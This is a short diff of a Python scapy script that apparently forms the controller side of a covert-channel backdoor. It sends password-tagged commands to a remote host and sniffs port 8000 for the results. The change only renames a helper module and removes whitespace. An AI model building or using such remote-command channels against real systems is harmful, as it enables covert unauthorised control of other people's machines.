@@ -1,6 +1,6 @@
 #!/usr/bin/python
 
-import time, configfile, logging, encryption, packetFunctions
+import time, configfile, logging, encryption, helpers
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 
@@ -30,7 +30,7 @@ def recvCommand(packet):
    global Results
    if packet.haslayer(IP):
     if packet[IP].src == configfile.ip:
-        dataReceived = packetFunctions.parsePacket(packet)
+        dataReceived = helpers.parsePacket(packet)
         Results += (dataReceived)
         if packet.haslayer(Raw):
             if packet[Raw].load == configfile.password:
@@ -53,7 +53,7 @@ def main():
         command = raw_input("Enter command: ")
         sendCommand(configfile.protocol, command, configfile.password)
         flag = False
-        
+
         while 1:
             sniff(filter='{0} and dst port 8000'.format(configfile.protocol), count=1, prn=recvCommand)
             if flag == True:
